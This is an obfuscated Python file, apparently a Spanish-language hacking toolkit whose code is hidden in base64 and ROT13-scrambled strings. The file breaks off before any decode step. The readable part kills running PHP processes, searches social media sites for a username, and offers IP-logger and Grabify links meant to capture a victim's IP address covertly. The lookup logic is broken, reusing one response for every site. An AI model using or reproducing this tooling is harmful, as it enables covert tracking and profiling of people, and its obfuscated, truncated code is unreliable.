# ---------------- Herramienta de codigo cerrado ---------------- #
import base64, codecs
magic = 'aW1wb3J0IG9zDQppbXBvcnQgdGltZQ0KaW1wb3J0IHN1YnByb2Nlc3MNCmltcG9ydCByYW5kb20NCmltcG9ydCBweXNob3J0ZW5lcnMNCmltcG9ydCByZXF1ZXN0cw0KaW1wb3J0IHB5cXJjb2RlDQppbXBvcnQgcG5nDQpmcm9tIGZha2VyIGltcG9ydCBGYWtlcg0KaW1wb3J0IHdlYmJyb3dzZXINCg0KY2xhc3MgQ29sb3JlczoNCiAgcmVkPSJcMDMzWzMxOzFtIg0KICB2ZXJkZT0iXDAzM1s5Mm0iDQogIGF6dWw9IlwwMzNbOTRtIg0KICBtYWdlbnRhPSJcMDMzWzM2bSINCiAgYW1hcmlsbG89IlwwMzNbMzNtIg0KICANCm9zLnN5c3RlbSgia2lsbGFsbCBwaHAiKQ0Kb3Muc3lzdGVtKCJjbGVhciIpDQpyYW5kb21jb2xvcj1bQ29sb3Jlcy5yZWQsQ29sb3Jlcy52ZXJkZSxDb2xvcmVzLmF6dWwsQ29sb3Jlcy5tYWdlbnRhXQ0KI3JhbmRvbS5zaHVmZmxlKHJhbmRvbWNvbG9yKQ0KbG9nbyA9IENvbG9yZXMucmVkICsgJycnDQrCt+KWhOKWhOKWhOKWhCAgICAgICAg4paQ4paE4oCiIOKWhCDilpDiloTigKIg4paEIOKWhOKWhOKWhCAu4paE4paE4paEICAgICAg4paE4paE4paE4paE4paEICAgICAgICAgICAg4paE4paE4paMICDiloQg4oCi4paEIOKWqiAg4paE4paE4paE4paE4paEDQrilojilojilqog4paI4paIIOKWqiAgICAgIOKWiOKWjOKWiOKWjOKWqiDilojilozilojilozilqriloDiloQu4paAwrfiloDiloQg4paIwrcgICAg4oCi4paI4paIICDilqogICAgIOKWqiAgICAg4paI4paI4oCiICDilojiloziloTilozilqrilojilogg4oCi4paI4paIICANCuKWkOKWiMK3IOKWkOKWiOKWjCDiloTilojiloDiloQgIMK34paI4paIwrcgIMK34paI4paIwrcg4paQ4paA4paA4paq4paE4paQ4paA4paA4paEICAgICAg4paQ4paILuKWqiDiloTilojiloDiloQgIOKWhOKWiOKWgOKWhCDilojilojilqogIOKWkOKWgOKWgOKWhMK34paQ4paIwrcg4paQ4paILuKWqg0K4paI4paILiDilojilogg4paQ4paI4paMLuKWkOKWjOKWquKWkOKWiMK34paI4paM4paq4paQ4paIwrfilojilozilpDilojiloTiloTilozilpDilojigKLilojilowgICAgIOKWkOKWiOKWjMK34paQ4paI4paMLuKWkOKWjOKWkOKWiOKWjC7ilpDilozilpDilojilozilpDilozilpDilogu4paI4paM4paQ4paI4paMIOKWkOKWiOKWjMK3DQriloDiloDiloDiloDiloDigKIgIOKWgOKWiOKWhOKWgOKWquKAouKWgOKWgCDiloDiloDigKLiloDiloAg4paA4paAIOKWgOKWgOKWgCAu4paAICDiloAgICAgIOKWgOKWgOKWgCAg4paA4paI4paE4paA4paqIOKWgOKWiOKWhOKWgOKWqi7iloDiloDiloAgwrfiloAgIOKWgOKWgOKWgOKWgCDiloDiloDiloAgDQogICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIEJ5OiAgRXVyb255bW91NQ0KICAgICAgICAgICAgICAgICAgICBfX19fX19fX19fX19fX18NCg0KICAgICAgICAgICAgICAgICAgICAgVmVyc2lvbjogdjEuOA0KICAgICAgICAgICAgICAgICAgICAgX19fX19fX19fX19fXw0KJycnDQoNCmRlZiBzaGVyKCk6DQogIHByaW50KGYne0NvbG9yZXMudmVyZGV9W35dIEF0ZW5jaW9uIG5vIHNpZW1wcmUgbG9zIHJlc3VsdGFkb3Mgc29uIDEwMCUgcHJlY2lzb3MnKQ0KICB1c3VhcmlvID0gaW5wdXQoZid7Q29sb3Jlcy5yZWR9W35dIEluZ3Jlc2EgZWwgbm9tYnJlIGRlbCB1c3VhcmlvOiAnKQ0KICBwcmludCgnICcpDQogIHVybCA9ICJodHRwczovL3d3dy5pbnN0YWdyYW0uY29tLyIgKyB1c3VhcmlvDQogIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KHVybCkNCiAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOg0KICAgIHJlc3BvbnNlLmNsb3NlKCkNCiAgICBwcmludChmJ1t+XSBVc3VhcmlvIGVuY29udHJhZG8gZW4gSW5zdGFncmFtIToge3VybH0nKQ0KICAgIHRpbWUuc2xlZXAoMikNCiAgZWxzZToNCiAgICBwcmludCgnW35dIFVzdWFyaW8gbm8gZW5jb250cmFkbyBlbiBJbnN0YWdyYW0hJykNCiAgICB0aW1lLnNsZWVwKDIpDQogICMtLS0tLS0tLS0tLS0tLS0tLVR3aXR0ZXItLS0tLS0tLS0tLS0tLS0tLS0tDQogIHByaW50KCcgJykNCiAgdXJsID0gImh0dHBzOi8vdHdpdHRlci5jb20vIiArIHVzdWFyaW8NCiAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOg0KICAgIHJlc3BvbnNlLmNsb3NlKCkNCiAgICBwcmludChmJ1t+XSBVc3VhcmlvIGVuY29udHJhZG8gZW4gVHdpdHRlciE6IHt1cmx9JykNCiAgICB0aW1lLnNsZWVwKDIpDQogIGVsc2U6DQogICAgcHJpbnQoJ1t+XSBVc3VhcmlvIG5vIGVuY29udHJhZG8gZW4gVHdpdHRlciEnKQ0KICAgIHRpbWUuc2xlZXAoMikNCiAgIy0tLS0tLS0tLS0tLS0tUmVkaXR0LS0tLS0tLS0tLS0tLS0tLS0tDQogIHByaW50KCcgJykNCiAgdXJsID0gImh0dHBzOi8vd3d3LnJlZGRpdC5jb20vdXNlci8iICsgdXN1YXJpbw0KICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDA6DQogICAgcmVzcG9uc2UuY2xvc2UoKQ0KICAgIHByaW50KGYnW35dIFVzdWFyaW8gZW5jb250cmFkbyBlbiByZWRkaXQhOiB7dXJsfScpDQogICAgdGltZS5zbGVlcCgyKQ0KICBlbHNlOg0KICAgIHByaW50KCdbfl0gVXN1YXJpbyBubyBlbmNvbnRyYWRvIGVuIHJlZGRpdCEnKQ0KICAgIHRpbWUuc2xlZXAoMikNCiAgIy0tLS0tLS0tLS0tLS0tUGludGlyZXN0LS0tLS0tLS0tLS0tLS0NCiAgcHJpbnQoJyAnKQ0KICB1cmwgPSBmImh0dHBzOi8vd3d3LnBpbnRlcmVzdC5jb20ve3VzdWFyaW99LyINCiAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOg0KICAgIHJlc3BvbnNlLmNsb3NlKCkNCiAgICBwcmludChmJ1t+XSBVc3VhcmlvIGVuY29udHJhZG8gZW4gUGludGVyZXN0IToge3VybH0nKQ0KICAgIHRpbWUuc2xlZXAoMikNCiAgZWxzZToNCiAgICBwcmludCgnW35dIFVzdWFyaW8gbm8gZW5jb250cmFkbyBlbiBQaW50ZXJlc3QhJykNCiAgICB0aW1lLnNsZWVwKDIpDQogICMtLS0tLS0tLS0tLS0tLS0tLVBvcm5odWItLS0tLS0tLS0tLS0NCiAgcHJpbnQoJyAnKQ0KICB1cmwgPSAiaHR0cHM6Ly9wb3JuaHViLmNvbS91c2Vycy8iICsgdXN1YXJpbw0KICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDA6DQogICAgcmVzcG9uc2UuY2xvc2UoKQ0KICAgIHByaW50KGYnW35dIFVzdWFyaW8gZW5jb250cmFkbyBlbiBQb3JuaHViIToge3VybH0nKQ0KICAgIHRpbWUuc2xlZXAoMikNCiAgZWxzZToNCiAgICBwcmludCgnW35dIFVzdWFyaW8gbm8gZW5jb250cmFkbyBlbiBQb3JuaHViIScpDQogICAgdGltZS5zbGVlcCgyKQ0KICAjLS0tLS0tLS0tLS0tLS0tLS0tLS1Zb3V0dWJlLS0tLS0tLS0tLS0NCiAgcHJpbnQoJyAnKQ0KICB1cmwgPSAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vIiArIHVzdWFyaW8NCiAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOg0KICAgIHJlc3BvbnNlLmNsb3NlKCkNCiAgICBwcmludChmJ1t+XSBVc3VhcmlvIGVuY29udHJhZG8gZW4gWW91dHViZSE6IHt1cmx9JykNCiAgICB0aW1lLnNsZWVwKDIpDQogIGVsc2U6DQogICAgcHJpbnQoJ1t+XSBVc3VhcmlvIG5vIGVuY29udHJhZG8gZW4gWW91dHViZSEnKQ0KICAgIHRpbWUuc2xlZXAoMikNCiAgIy0tLS0tLS0tLS0tLS0tLS0tLVhib3gtLS0tLS0tLS0tLS0tLS0tLS0NCiAgcHJpbnQoJyAnKQ0KICB1cmwgPSAiaHR0cHM6Ly94Ym94Z2FtZXJ0YWcuY29tL3NlYXJjaC8iICsgdXN1YXJpbw0KICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDA6DQogICAgcmVzcG9uc2UuY2xvc2UoKQ0KICAgIHByaW50KGYnW35dIFVzdWFyaW8gZW5jb250cmFkbyBlbiBYYm94IToge3VybH0nKQ0KICAgIHRpbWUuc2xlZXAoMikNCiAgZWxzZToNCiAgICBwcmludCgnW35dIFVzdWFyaW8gbm8gZW5jb250cmFkbyBlbiBYYm94IScpDQogICAgdGltZS5zbGVlcCgyKQ0KICAjLS0tLS0tLS0tLS0tLS0tLS0tLS0tU3BvdGlmeS0tLS0tLS0tLS0tLQ0KICBwcmludCgnICcpDQogIHVybCA9ICJodHRwczovL29wZW4uc3BvdGlmeS5jb20vdXNlci8iICsgdXN1YXJpbw0KICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDA6DQogICAgcmVzcG9uc2UuY2xvc2UoKQ0KICAgIHByaW50KGYnW35dIFVzdWFyaW8gZW5jb250cmFkbyBlbiBTcG90aWZ5IToge3VybH0nKQ0KICAgIHRpbWUuc2xlZXAoMikNCiAgZWxzZToNCiAgICBwcmludCgnW35dIFVzdWFyaW8gbm8gZW5jb250cmFkbyBlbiBTcG90aWZ5IScpDQogICAgdGltZS5zbGVlcCgyKQ0KICAjLS0tLS0tLS0tLS0tLS0tLS0tUGF0cmVvbi0tLS0tLS0tLS0tLS0NCiAgcHJpbnQoJyAnKQ0KICB1cmwgPSAiaHR0cHM6Ly93d3cucGF0cmVvbi5jb20vIiArIHVzdWFyaW8NCiAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOg0KICAgIHJlc3BvbnNlLmNsb3NlKCkNCiAgICBwcmludChmJ1t+XSBVc3VhcmlvIGVuY29udHJhZG8gZW4gUGF0cmVvbiE6IHt1cmx9JykNCiAgICB0aW1lLnNsZWVwKDIpDQogIGVsc2U6DQogICAgcHJpbnQoJ1t+XSBVc3VhcmlvIG5vIGVuY29udHJhZG8gZW4gUGF0cmVvbiEnKQ0KICAgIHRpbWUuc2xlZXAoMikNCiAgIy0tLS0tLS0tLS0tLU15c3BhY2UtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KICBwcmludCgnICcpDQogIHVybCA9ICJodHRwczovL215c3BhY2UuY29tLyIgKyB1c3VhcmlvDQogIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoNCiAgICByZXNwb25zZS5jbG9zZSgpDQogICAgcHJpbnQoZidbfl0gVXN1YXJpbyBlbmNvbnRyYWRvIGVuIE15c3BhY2UhOiB7dXJsfScpDQogICAgdGltZS5zbGVlcCgyKQ0KICBlbHNlOg0KICAgIHByaW50KCdbfl0gVXN1YXJpbyBubyBlbmNvbnRyYWRvIGVuIE15c3BhY2UhJykNCiAgICB0aW1lLnNsZWVwKDIpDQogICMtLS0tLS0tLS0tLS0tLS1NeWFuaW1lbGlzdC0tLS0tLS0tLS0tLS0tLS0NCiAgcHJpbnQoJyAnKQ0KICB1cmwgPSAiaHR0cHM6Ly9teWFuaW1lbGlzdC5uZXQvcHJvZmlsZS8iICsgdXN1YXJpbw0KICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDA6DQogICAgcmVzcG9uc2UuY2xvc2UoKQ0KICAgIHByaW50KGYnW35dIFVzdWFyaW8gZW5jb250cmFkbyBlbiBNeWFuaW1lbGlzdCE6IHt1cmx9JykNCiAgICB0aW1lLnNsZWVwKDIpDQogIGVsc2U6DQogICAgcHJpbnQoJ1t+XSBVc3VhcmlvIG5vIGVuY29udHJhZG8gZW4gTXlhbmltZWxpc3QhJykNCiAgICB0aW1lLnNsZWVwKDIpDQogICMtLS0tLS0tLS0tLS0tLS0tLUdpdGh1Yi0tLS0tLS0tLS0tLS0tDQogIHByaW50KCcgJykNCiAgdXJsID0gImh0dHBzOi8vZ2l0aHViLmNvbS8iICsgdXN1YXJpbw0KICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDA6DQogICAgcmVzcG9uc2UuY2xvc2UoKQ0KICAgIHByaW50KGYnW35dIFVzdWFyaW8gZW5jb250cmFkbyBlbiBHaXRodWIhOiB7dXJsfScpDQogICAgdGltZS5zbGVlcCgyKQ0KICBlbHNlOg0KICAgIHByaW50KCdbfl0gVXN1YXJpbyBubyBlbmNvbnRyYWRvIGVuIEdpdGh1YiEnKQ0KICAgIHRpbWUuc2xlZXAoMikNCiAgIy0tLS0tLS0tLS0tLS0tLS1Ud2l0Y2gtLS0tLS0tLS0tLQ0KICBwcmludCgnICcpDQogIHVybCA9ICJodHRwczovL3d3dy50d2l0Y2gudHYvIiArIHVzdWFyaW8NCiAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOg0KICAgIHJlc3BvbnNlLmNsb3NlKCkNCiAgICBwcmludChmJ1t+XSBVc3VhcmlvIGVuY29udHJhZG8gZW4gVHdpdGNoIToge3VybH0nKQ0KICAgIHRpbWUuc2xlZXAoMikNCiAgZWxzZToNCiAgICBwcmludCgnW35dIFVzdWFyaW8gbm8gZW5jb250cmFkbyBlbiBUd2l0Y2ghJykNCiAgICB0aW1lLnNsZWVwKDIpDQoNCmRlZiBpcGxvZygpOg0KICBvcy5zeXN0ZW0oImNsZWFyIikNCiAgcHJpbnQobG9nbykNCiAgcHJpbnQoJ1xuW35dIEluZ3Jlc2EgdW5hIG9wY2lvbi4nKQ0KICBwcmludCgnJydcbg0KICBbMV0gSVBsb2dnZXIub3JnDQogIA0KICBbMl0gR3JhYmlmeQ0KICANCiAgWzNdIENyZWFyIHVuIGxpbmsgSVBsb2dnZXIgDQogIA0KICBbMDBdIFJlZ3Jlc2FyIGFsIG1lbnUgcHJpbmNpcGFsDQogIA0KICBbOTldIFNhbGlyDQogICcnJykNCiAgb3BjID0gaW50KGlucHV0KCdbfl0gRWxpamUgdW5hIG9wY2lvbjogJykpDQogIGlmIG9wYyA9PSAxOg0KICAgIHByaW50KCdcblsxXSBBYnJpciBsaW5rIHBhcmEgbGludXgnKQ0KICAgIHByaW50KCdcblsyXSBBYnJpciBsaW5rIHBhcmEgdGVybXV4JykNCiAgICBwcmludCgnXG5bMDBdIFJlZ3Jlc2FyIGFsIG1lbnUgYW50ZXJpb3InKQ0KICAgIHByaW50KCdcbls5OV0gU2FsaXInKQ0KICAgIFNrZCA9IGludChpbnB1dCgnW35dIEVsaWplIHVuYSBvcGNpb246ICcpKQ0KICAgIGlmIFNrZCA9PSAxOg0KICAgICAgd2ViYnJvd3Nlci5vcGVuKCdodHRwczovL2lwbG9nZ2VyLm9yZy9lcy8nKQ0KICAgICAgaXBsb2coKQ0KICAgIGVsaWYgU2tkID09IDI6DQogICAgICBvcy5zeXN0ZW0oInRlcm11eC1vcGVuIGh0dHBzOi8vaXBsb2dnZXIub3JnL2VzLyIpDQogICAgICBpcGxvZygpDQogICAgZWxpZiBTa2QgPT0gMDA6DQogICAgICBpcGxvZygpDQogICAgZWxpZiBTa2QgPT0gOTk6DQogICAgICBleGl0KCkNCiAgICBlbHNlOg0KICAgICAgcHJpbnQoJ1t+XSBFcnJvciBvcGNpb24gaW52YWxpZGEuJykNCiAgICAgIHR'
love = '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